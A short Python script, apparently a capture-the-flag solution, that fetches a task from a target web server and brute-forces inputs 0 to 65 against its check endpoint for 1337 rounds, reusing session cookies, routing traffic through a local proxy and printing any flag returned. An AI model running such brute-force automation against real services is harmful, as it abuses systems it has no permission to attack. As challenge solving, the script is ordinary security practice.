import requests

def main():
    from sys import argv
    if(len(argv) < 2):
        print("Usage: python3 solve.py https://example.com")
        return
    url = argv[1]
    last = requests.get(f'{url}/generate-task')
    for i in range(1337):
        print(i)
        for j in range(66):
            r = requests.post(f'{url}/check-task',json={"input": j},cookies=last.cookies,proxies={'http':"http://localhost:8080"})
            s = r.json()
            if(s['flag']):
                print(s['flag'])
            if(s['success']):
                break

if __name__ == "__main__":
    main()